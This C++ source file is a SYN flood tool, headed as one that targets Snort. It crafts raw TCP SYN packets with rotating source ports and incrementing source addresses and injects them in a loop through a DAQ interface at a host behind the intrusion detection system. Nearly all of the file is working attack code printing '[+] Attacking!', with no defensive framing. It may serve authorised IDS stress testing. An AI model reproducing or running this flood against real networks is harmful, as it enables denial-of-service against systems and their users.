/*
 * Copyright (c) Victor Roemer, 2013. All rights reserved.
 * Feb 24 2013
 * Syn/Syn-Ack Flood That Targets Snort
 *
 */

// DAQ Global - vjr
#include <sys/un.h>
#ifndef _GNU_SOURCE
# define _GNU_SOURCE
#endif
#include <pthread.h>

#include <array>
#include <atomic>
#include <cstdio>
#include <functional>
#include <memory>
#include <string>
#include <iostream>
#include <thread>
#include <vector>

#include <daq.h>
#include <daq_module_api.h>
#include <packet.h>
#include <packet/dns.h>
#include <pcap.h>


#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cstring>
#include <ctime>
#include <cerrno>

#include <unistd.h>
#include <getopt.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>

extern "C" int ip_checksum ( void *, size_t );

/***************************************************************************
 *                            Packet Data Type                             *
 ***************************************************************************/

#define MY_IP_VERS  4
#define MY_IP_HLEN  5
#define MY_IP_TTL   64

#define START_PORT  1024

#define PKTBUFSIZ 1472
#define FIXEDSIZE \
    (sizeof(struct ether_header)+sizeof(struct ip)*1+sizeof(struct tcphdr))

struct PacketTemplate {
    struct ether_header eth;
    struct ip           ip;
    //struct ip           ip2;
    struct tcphdr       tcp;
    unsigned char       payload[(PKTBUFSIZ - FIXEDSIZE)];
} __attribute__((__packed__));

/***************************************************************************
 *                             Runtime Options                             *
 ***************************************************************************/

static unsigned opt__egress_id;
static const char *opt__ifr_name;
static const char *opt__src_ipaddr;
static const char *opt__dst_ipaddr;
static const char *opt__dst_hwaddr;
static const char *opt__src_hwaddr;
static unsigned   opt__loop_count;

static const char * const shortopts = "he:i:s:d:S:D:l:";
static struct option longopts[] =
{
    { "help", no_argument, NULL, 'h' },
    { "dev", required_argument, NULL, 'e' },
    { "intf", required_argument, NULL, 'i' },
    { "src-ip", required_argument, NULL, 's' },
    { "dst-ip", required_argument, NULL, 'd' },
    { "dst-mac", required_argument, NULL, 'D' },
    { "src-mac", required_argument, NULL, 'S' },
    { "loop", required_argument, NULL, 'l' },
    { NULL, 0, NULL, 0 }
};

static void display_usage ( void )
{
    fprintf(stdout,
      "Usage: syn_ack_flood --intf <dev> -D <mac> --src-ip <ip> --dst-ip <ip>\n\n");
}

static void display_help ( void )
{
    display_usage();
    fprintf(stdout,
      "  Options:\n"
      "\t-e <dev_id>, --dev <id>        Device index to send packets to\n"
      "\t-i <dev>, --intf <dev>         Device to send packets from\n"
      "\t-D <mac>, --dst-mac <mac>      HW address of your default gw\n"
      "\t-s <ip>, --src-ip <ip>         Starting source address\n"
      "\t-d <ip>, --dst-ip <ip>         Destination address (A box behind Snort)\n"
      "\t-l <cnt>, --loop <cnt>         Number of packets to send\n"
      "\n"
      "  Misc Options:\n"
      "\t-h, --help                     Display this help\n"
      "\n"
    );
}

static int do_args ( int argc, char *argv[] )
{
    int argi, ch;
    while ( (ch = getopt_long(argc, argv, shortopts, longopts, &argi)) != -1)
    {
        switch ( ch )
        {
            case 'e':
                opt__egress_id = atoi(optarg);
                break;

            case 'i':
                opt__ifr_name = optarg;
                break;

            case 's':
                opt__src_ipaddr = optarg;
                break;

            case 'd':
                opt__dst_ipaddr = optarg;
                break;

            case 'D':
                opt__dst_hwaddr = optarg;
                break;

            case 'S':
                opt__src_hwaddr = optarg;
                break;

            case 'l':
                opt__loop_count = atoi(optarg);
                break;

            case 'h':
                display_help();
                exit(0);
                break;

            default:
                fprintf(stdout,
                  "Try `syn_ack_attack --help' for more information.\n\n");
                exit(1);
        }
    }

    /* Required arguments */
    if ( !opt__ifr_name || !opt__dst_hwaddr || !opt__dst_ipaddr ||
         !opt__src_ipaddr )
    {
        fprintf(stderr, "Missing required arguements!\n");
        display_usage();
        exit(1);
    }

    return 0;
}

#define TXT_FG_RED(str)   "\e[31m" str "\e[0m"
#define TXT_FG_GREEN(str)   "\e[32m" str "\e[0m"
#define TXT_FG_ORANGE(str)   "\e[33m" str "\e[0m"
#define TXT_FG_TEAL(str)   "\e[34m" str "\e[0m"
#define TXT_FG_PURPLE(str)   "\e[35m" str "\e[0m"

#include "daq_print.h"

/* DLT_RAW
 *
 * Mandatory, as the VPP daq only supports L3 delivery.
 *
 * This is used to set the "base protocol" used in libpcap and libpacket
 * features.
 */
//#define DLT_RAW 12

/* DAQ_BATCH_SIZE
 *
 * The maximum number of packets (DAQ_Msg_h) that we will batch read/process at
 * once.
 */
#define DAQ_BATCH_SIZE 16

/* SNAPLEN
 *
 *  The SNAPLEN is the absolulte maximum size packet we support processing.
 *  NOTICE: This value should be defined by VPP as the vlib buffer size.
 */
#define SNAPLEN 2048

/* TIMEOUT
 *
 * The TIMEOUT amount of usec waiting for daq_receive to return.
 * NOTICE: TIMEOUT support in redacted DAQ only works in interrupt mode.
 */
#define TIMEOUT 100

/* STATIC_MODULES
 *
 *  Enables the support of builtin libdaq_static_redacted.la
 *
 * If you're in a pinch and need to build an all-in-one static binary, you can
 * do it, but not using the Makefile. */
#undef STATIC_MODULES

#define UNUSED(name) name ## _unused __attribute__ ((unused))
#define IS_SET(test, bits) (((test) & (bits)) == (bits))

#ifndef UNIX_PATH_MAX
#define UNIX_PATH_MAX (sizeof(((struct sockaddr_un*)NULL)->sun_path))
#endif

using socketpath_t = char[UNIX_PATH_MAX];

#define ERRBUF_SIZE 256
using Errbuf = std::array<char, ERRBUF_SIZE>;

// DaqVariable
using DaqVariable = std::pair<std::string, std::string>;
using DaqVars = std::vector<DaqVariable>;

namespace DAQ
{
#ifdef STATIC_MODULES
    // from libdaq_static_redacted.a
    extern "C" const DAQ_ModuleAPI_t redacted_daq_module_data;

    static DAQ_Module_h static_modules[] =
    {
        &redacted_daq_module_data,
        nullptr
    };
#endif

    static char const *module_paths[] =
    {
        "/usr/local/lib/abcip",
        "/usr/local/lib/daq",
        nullptr
    };

    static bool s_modules_loaded = false;
    void load_modules()
    {
        if (s_modules_loaded == false)
        {
            s_modules_loaded = true;
#ifdef STATIC_MODULES
            daq_load_static_modules(static_modules);
#endif
            daq_load_dynamic_modules(module_paths);
        }
    }

    void unload_modules()
    {
        if (s_modules_loaded == true)
        {
            daq_unload_modules();
            s_modules_loaded = false;
        }
    }
}

// DaqConfig
//
// DaqConfig is a "copy safe" representation of a DAQ_Config_h opaque pointer.
// This would be trivial to implement if the DAQ_Config_t type was avaiable
// from the DAQ API.
//
// The DaqConfig attempts to make a mutable representation of a DAQ_Config_h.
// To accomplish this task, it implements a factory pattern, constructring C++
// type DAQ_Config_p that provides a constructor/desctructor for DAQ_Config_h.
//
// NOTICE
//
//  * Implementing this would be easier if the DAQ_Config_t was not hidden from
//    the DAQ API.
//
class DaqConfig
{
public:
    DaqConfig(std::string module, std::string input, DAQ_Mode mode, DaqVars const & vars)
        : module(module),
          input(input),
          mode(mode),
          vars(vars)
    { }

    struct DAQ_Config_p
    {
        DAQ_Config_p(std::string module, std::string input, DAQ_Mode mode, DaqVars const & vars)
            : config(nullptr)
        {
            daq_config_new(&config);
            daq_config_set_input(config, input.c_str());
            daq_config_set_snaplen(config, SNAPLEN);
            daq_config_set_timeout(config, TIMEOUT);

            DAQ_Module_h mod = daq_find_module(module.c_str());
            if (mod == nullptr) {
                daq_config_destroy(config);
                config = nullptr;
            }

            DAQ_ModuleConfig_h modconf = nullptr;
            int result = daq_module_config_new(&modconf, mod);
            if (result != DAQ_SUCCESS) {
                daq_config_destroy(config);
                config = nullptr;
            }

            daq_module_config_set_mode(modconf, mode);
            for (auto const & var : vars) {
                daq_module_config_set_variable(modconf, var.first.c_str(), var.second.c_str());
            }

            result = daq_config_push_module_config(config, modconf);
            if (result != DAQ_SUCCESS) {
                // NOTICE This is the only time we are allowed to call this ourselves.
                daq_module_config_destroy(modconf);
                modconf = nullptr;

                daq_config_destroy(config);
                config = nullptr;
            }
        }

        ~DAQ_Config_p()
        {
            // Calling daq_config_destroy will call
            // `daq_module_config_destroy(modcfg)` on each module.
            daq_config_destroy(config);
            config = nullptr;
        }

        DAQ_Config_h config;
    };

    DAQ_Config_p get_config() const
    {
        return DAQ_Config_p(module, input, mode, vars);
    }

private:
    std::string module;
    std::string input;
    DAQ_Mode mode;
    DaqVars vars;
};

#define FRAME_SIZE 256

struct DaqMsgFrame
{
    std::array<DAQ_Msg_h, FRAME_SIZE> msgs;
    size_t recv_count;
};

struct DaqVerdictFrame
{
    std::array<DAQ_Verdict, FRAME_SIZE> verdicts;
};

struct RecvResult
{
    DAQ_RecvStatus status;
    DaqMsgFrame const& frame;
};

class DaqInstance
{
public:
    DaqInstance(DaqConfig const & config)
        : instance(NULL), config(config)
    {}

    ~DaqInstance()
    {
        if (instance) {
            daq_instance_destroy(instance);
            instance = nullptr;
        }

        msgs.recv_count = 0;
    }

    DaqInstance(DaqInstance const & other)
        : config(other.config)
    { }

    int instantiate()
    {
        return daq_instance_instantiate(
                config.get_config().config,
                &instance,
                errbuf.data(),
                errbuf.size());
    }

    int start()
    {
        return daq_instance_start(instance);
    }

    int stop()
    {
        return daq_instance_stop(instance);
    }

    RecvResult receive_msgs()
    {
        DAQ_RecvStatus rstat;
        msgs.recv_count = daq_instance_msg_receive(
                instance,
                msgs.msgs.max_size(),
                msgs.msgs.data(),
                &rstat);

        return { rstat, msgs };
    }

    //void finalize_msgs(DAQ_Verdict const & verdict)
    void finalize_msgs(DaqVerdictFrame const & verdicts)
    {
        for (unsigned i = 0; i < msgs.recv_count; i++)
        {
            DAQ_Msg_h msg = msgs.msgs[i];
            DAQ_Verdict verdict = verdicts.verdicts[i];
            daq_instance_msg_finalize(instance, msg, verdict);
        }

        msgs.recv_count = 0;
    }

    int inject(uint8_t const* data, uint32_t const len)
    {
        // XXX Possible to inject arbitrary packet/data back into the subsystem here.
        // Good option for data-plane data updates (nbar, appid, etc)
        DAQ_PktHdr_t ph = {};
        //ph.ingress_index = 1;
        ph.ingress_index = opt__egress_id;
        return daq_instance_inject(
                instance,
                DAQ_MSG_TYPE_PACKET,
                &ph,
                data,
                len);
    }

    DAQ_Stats_t get_stats() const
    {
        DAQ_Stats_t stats;
        daq_instance_get_stats(instance, &stats);
        return stats;
    }

    void reset_stats() const
    {
        daq_instance_reset_stats(instance);
    }

private:
    DAQ_Instance_h instance;
    DaqConfig config;
    DaqMsgFrame msgs;
    Errbuf errbuf;
};

class DataPlaneWorker
{
    using threadname_t = char[256];

public:
    DataPlaneWorker(DaqConfig config, unsigned id, std::string filter, DAQ_Verdict verdict, DAQ_Verdict default_verdict, PacketTemplate& packet)
        : config(config),
          id(id),
          match_verdict(verdict),
          default_verdict(default_verdict),
          packet(packet)
    {
        pcap_t *dead = pcap_open_dead(DLT_EN10MB, SNAPLEN);
        if (dead == nullptr)
            abort();

        if (pcap_compile(dead, &fcode, filter.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1)
        {
            fprintf(stderr, "%s: BPF state machine compilation failed!", __func__);
            abort();
        }

        pcap_close(dead);
        dead = nullptr;

        int result = bpf_validate(fcode.bf_insns, fcode.bf_len);
        if (result != 1)
        {
            fprintf(stderr, "%s: BPF is not valid!", __func__);
            abort();
        }

        thread = std::thread(&DataPlaneWorker::eval, this);
        pthread_t native = thread.native_handle();

        snprintf(name, sizeof(name), "pkt_wk_%u", id);
        pthread_setname_np(native, name);

        // Float these workers on core 4
        cpu_set_t cpuset;
        CPU_ZERO(&cpuset);
        CPU_SET(4+id, &cpuset);
        pthread_setaffinity_np(native, sizeof(cpuset), &cpuset);
    }

    ~DataPlaneWorker()
    {
        pcap_freecode(&fcode);
    }

    void join()
    {
        thread.join();
    }

    void eval()
    {
        DaqInstance in(config);

        in.instantiate();
        in.start();

        state = START;

        attack_i = 0;
        src_port = START_PORT;

        fprintf(stdout, "[+] Attacking!\n");

        do {
            auto recv = in.receive_msgs();

            if (recv.frame.recv_count > 0) {
                //print_packets(recv.frame);
            }

            if (attack(in) == 0) {
	      state = STOP;
	    }

            if (recv.status == DAQ_RSTAT_ERROR ||
                recv.status == DAQ_RSTAT_INVALID) {
                state = STOP;
            }

            in.finalize_msgs(verdicts);
            usleep(0);
        } while(state != STOP);
        fprintf(stdout, "[+] Stop!\n");

        in.stop();
    }

    void stop()
    {
        state = STOP;
    }

    bool is_active()
    {
	return state == START;
    }

private:
    int attack(DaqInstance& in)
    {
        while ( attack_i++ < opt__loop_count )
        {
            if ( (attack_i % (65535-START_PORT)) == 0 )
            {
                /* Increment the Source IP in the tunnel when the port space has
                 * been exhausted -- reset port to START_PORT */
                //uint32_t ip = ntohl(packet.ip2.ip_src.s_addr) + 1;
                uint32_t ip = ntohl(packet.ip.ip_src.s_addr) + id + 1;

                /* Don't let last octet be 0 or 255 */
                ((ip & 0xFF) == 255)
                    ? ip+=2
                    : ((ip % 0xFF) == 0)
                        ? ip+=1
                        : 0;

                //packet.ip2.ip_src.s_addr = htonl(ip);
                packet.ip.ip_src.s_addr = htonl(ip);
                src_port = START_PORT;
            }
            else
            {
                /* Each packet has a unique source port. */
                src_port++;
            }

            uint16_t ip_len = ntohs(packet.ip.ip_len);
            size_t pktlen = ip_len + sizeof(packet.eth);
            packet.tcp.th_sport = htons(src_port);
            packet.tcp.th_dport = htons(80);
            ip_checksum(&packet.ip, ip_len);

            printf("[" TXT_FG_PURPLE("inject") "] ");

            print_packet(id, nullptr, reinterpret_cast<uint8_t const*>(&packet), pktlen);
            in.inject(reinterpret_cast<uint8_t const*>(&packet), pktlen);

	    // Free some time to check the receive rings.
	    if ((attack_i % 1024) == 0) {
		return 1;
	    }
        }

	// Complete
	return 0;
    }

    bool filter_packet(UNUSED(DAQ_PktHdr_t const* hdr),
            uint8_t const* data,
            uint32_t const size,
            bpf_program const& fcode)
    {
        return bpf_filter(fcode.bf_insns, data, size, size) == SNAPLEN;
    }

    void print_packets(DaqMsgFrame const& frame)
    {
        for (unsigned i = 0; i < frame.recv_count; i++)
        {
            auto const & msg = frame.msgs[i];
            if (msg->type == DAQ_MSG_TYPE_PACKET)
            {
                DAQ_PktHdr_t const * hdr = daq_msg_get_pkthdr(msg);
                uint8_t const * data = daq_msg_get_data(msg);
                uint32_t const size = daq_msg_get_data_len(msg);

                verdicts.verdicts[i] = match_verdict;
                printf("[" TXT_FG_PURPLE("match") "] ");
                print_packet(id, hdr, data, hdr->pktlen);
            }
        }
    }

    DaqConfig config;
    unsigned id;

    enum { INVAL, STOP, START } state;
    std::thread thread;
    threadname_t name;
    bpf_program fcode;
    DaqVerdictFrame verdicts;

    DAQ_Verdict match_verdict;
    DAQ_Verdict default_verdict = DAQ_VERDICT_PASS;

    /* Data-plane, runtime state */
    PacketTemplate packet;
    unsigned attack_i;
    uint16_t src_port;
};


int main (int argc, char const *argv[])
{
    do_args(argc, (char **)argv);

    /* Initialize the packet data */
    fprintf(stdout, "[+] Framming packet template\n");
    PacketTemplate packet = {};

    /* ETHERNET Frame */
    packet.eth.ether_type = htons(ETHERTYPE_IP);
    if ( opt__dst_hwaddr )
    {
        struct ether_addr *hw = ether_aton(opt__dst_hwaddr);
        if ( !hw )
        {
            fprintf(stderr, "[!] Error in destination hw address specified.\n");
            exit(1);
        }
        memcpy(&packet.eth.ether_dhost, hw, sizeof(packet.eth.ether_dhost));
    }

    /* ETHERNET Frame */
    if ( opt__src_hwaddr )
    {
        struct ether_addr *hw = ether_aton(opt__src_hwaddr);
        if ( !hw )
        {
            fprintf(stderr, "[!] Error in source hw address specified.\n");
            exit(1);
        }
        memcpy(&packet.eth.ether_shost, hw, sizeof(packet.eth.ether_shost));
    }



    std::string payload = "********************************"
	    		  "********************************"
			  "********************************"
			  "********************************"
			  "********************************"
			  "********************************"
			  "********************************"
			  "********************************";

    /* IP Datagram */
    //int ip_len = FIXEDSIZE - sizeof(packet.eth) + payload.length();
    int ip_len = FIXEDSIZE - sizeof(packet.eth) + payload.length();

    packet.ip.ip_v      = MY_IP_VERS;
    packet.ip.ip_hl     = MY_IP_HLEN;
    packet.ip.ip_ttl    = MY_IP_TTL;
    packet.ip.ip_len    = htons(ip_len);
    //packet.ip.ip_p      = IPPROTO_IPIP;
    packet.ip.ip_p      = IPPROTO_TCP;

    if ( inet_pton(AF_INET, opt__src_ipaddr, &packet.ip.ip_src) <= 0 )
    {
        fprintf(stderr, "[!] Error in source ip address specified.\n");
        exit(1);
    }

    if ( inet_pton(AF_INET, opt__dst_ipaddr, &packet.ip.ip_dst) <= 0 )
    {
        fprintf(stderr, "[!] Error in destination ip address specified.\n");
        exit(1);
    }

    /* IP2 */
    //packet.ip2.ip_v      = MY_IP_VERS;
    //packet.ip2.ip_hl     = MY_IP_HLEN;
    //packet.ip2.ip_ttl    = MY_IP_TTL;
    //packet.ip2.ip_len    = htons(ip_len - (packet.ip.ip_hl << 2));
    //packet.ip2.ip_p      = IPPROTO_TCP;
    //inet_pton(AF_INET, "10.0.0.1", &packet.ip2.ip_src);
    //inet_pton(AF_INET, "10.9.8.7", &packet.ip2.ip_dst);

    /* TCP Header */
    packet.tcp.th_off   = 0x5;
    packet.tcp.th_win   = htons(256);
    //packet.tcp.th_flags = TH_SYN|TH_ACK;
    packet.tcp.th_flags = TH_SYN;

    memcpy(packet.payload, payload.c_str(), payload.length());

    fprintf(stdout, "[+] Initializing DAQ!\n");

    DAQ::load_modules();
    packet_set_datalink(DLT_EN10MB);

    DaqVars vars {
        { "debug", "true" },
        { "zc", "0" },
        //{ "use_tx_ring", "false" },
        //{ "fanout_type", "lb" },
        //{ "buffer_size_mb", "max" },
    };

    DAQ_Verdict default_verdict = DAQ_VERDICT_PASS;
    DAQ_Verdict match_verdict = DAQ_VERDICT_PASS;
    std::string filter = "ip and host ";
    filter += opt__src_ipaddr;

    DaqConfig afpacket_config("afxdp", opt__ifr_name, DAQ_MODE_INLINE, vars);
    DataPlaneWorker wk0(afpacket_config, 0, filter, match_verdict, default_verdict, packet);
    //DataPlaneWorker wk1(afpacket_config, 1, filter, match_verdict, default_verdict, packet);
    //DataPlaneWorker wk2(afpacket_config, 2, filter, match_verdict, default_verdict, packet);
    //DataPlaneWorker wk3(afpacket_config, 3, filter, match_verdict, default_verdict, packet);
    //DataPlaneWorker wk4(afpacket_config, 4, filter, match_verdict, default_verdict, packet);

    sleep(5);

    while (wk0.is_active())// or
	   //wk1.is_active() or
	   //wk2.is_active())
	   //wk3.is_active() or
	   //wk4.is_active())
    {
	sleep(1);
    }

    wk0.stop();
    wk0.join();

    //wk1.stop();
    //wk1.join();

    //wk2.stop();
    //wk2.join();

    //wk3.stop();
    //wk3.join();

    //wk4.stop();
    //wk4.join();

    DAQ::unload_modules();
    return 0;
}

